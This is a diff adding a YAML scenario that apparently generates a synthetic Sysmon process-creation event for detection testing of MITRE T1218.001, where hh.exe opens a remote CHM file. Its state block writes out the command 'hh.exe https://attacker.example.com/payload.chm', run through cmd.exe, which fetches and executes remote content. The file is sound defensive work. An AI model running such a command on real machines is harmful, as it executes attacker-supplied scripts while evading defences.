@@ -1,0 +1,113 @@
+type: scenario
+description: |
+  Defense evasion via T1218.001: hh.exe (Microsoft HTML Help) loads a Compiled HTML
+  Help file (CHM) from a remote HTTP/HTTPS URL. The URL appears directly in the
+  process command line, allowing script engines (JScript, VBScript) embedded in the
+  CHM to execute under the hh.exe process context.
+tags: [eid1]
+mitre:
+  tactics: [defense-evasion]
+  techniques: [T1218.001]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  sysmon_pid:          gen.int(min=1000, max=4000)
+  sysmon_tid:          gen.int(min=1000, max=9999)
+  event_record_id:     gen.int(min=5000, max=99999)
+  proc_guid_raw:       gen.uuid()
+  proc_guid:           "{${ref.proc_guid_raw}}"
+  proc_pid:            gen.int(min=1000, max=9999)
+  parent_guid_raw:     gen.uuid()
+  parent_guid:         "{${ref.parent_guid_raw}}"
+  parent_pid:          gen.int(min=1000, max=9999)
+  logon_guid_raw:      gen.uuid()
+  logon_guid:          "{${ref.logon_guid_raw}}"
+  user:                gen.username()
+  domain_user:         "CORP\\${ref.user}"
+  remote_url:          "https://attacker.example.com/payload.chm"
+  command_line:        "hh.exe ${ref.remote_url}"
+  md5:                 fn.md5(ref.remote_url)
+  sha256:              fn.sha256(ref.remote_url)
+  imphash:             fn.md5(ref.command_line)
+  current_directory:   "C:\\Users\\${ref.user}\\AppData\\Local\\Temp\\"
+  logon_id:            "0x148e3a"
+  terminal_session_id: 2
+  integrity_level:     High
+  parent_image:        "C:\\Windows\\System32\\cmd.exe"
+  parent_command_line: "\"C:\\Windows\\system32\\cmd.exe\" /c \"${ref.command_line}\""
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.event_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.proc_guid
+            - "@Name": ProcessId
+              "#text": ref.proc_pid
+            - "@Name": Image
+              "#text": "C:\\Windows\\hh.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.14393.0 (rs1_release.160715-1616)"
+            - "@Name": Description
+              "#text": "Microsoft HTML Help Executable"
+            - "@Name": Product
+              "#text": "HTML Help"
+            - "@Name": Company
+              "#text": "Microsoft Corporation"
+            - "@Name": OriginalFileName
+              "#text": HH.exe
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.domain_user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": ref.terminal_session_id
+            - "@Name": IntegrityLevel
+              "#text": ref.integrity_level
+            - "@Name": Hashes
+              "#text": "MD5=${ref.md5},SHA256=${ref.sha256},IMPHASH=${ref.imphash}"
+            - "@Name": ParentProcessGuid
+              "#text": ref.parent_guid
+            - "@Name": ParentProcessId
+              "#text": ref.parent_pid
+            - "@Name": ParentImage
+              "#text": ref.parent_image
+            - "@Name": ParentCommandLine
+              "#text": ref.parent_command_line
